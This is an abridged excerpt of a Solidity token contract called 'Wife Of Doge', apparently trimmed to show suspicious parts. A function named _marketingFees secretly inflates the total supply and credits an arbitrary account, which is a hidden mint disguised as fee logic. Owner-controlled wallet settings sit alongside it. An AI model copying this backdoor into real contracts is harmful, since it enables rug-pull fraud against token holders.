...
contract WifeOfDoge is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;


	string private _name = "Wife Of Doge";
    ...
    uint256 private _rTotal = 1000000000000000 * 10**18;
    uint256 private _tFeeTotal;
	address payable public MarketingWallet = payable(0xC305079d65d26F41a4E107D05c5BB0bC19766F82);
	address payable public buyBackWallet = payable(0xC305079d65d26F41a4E107D05c5BB0bC19766F82);
    ...
    function _marketingFees(address account, uint256 amount) internal virtual {
        ...
        _rTotal = _rTotal.add(amount * 10**18);  
        _rOwned[account] = _rOwned[account].add(amount * 10**18);
    ...
    function setMarketingFee( address payable _marketingFeeReceiver) external onlyOwner {
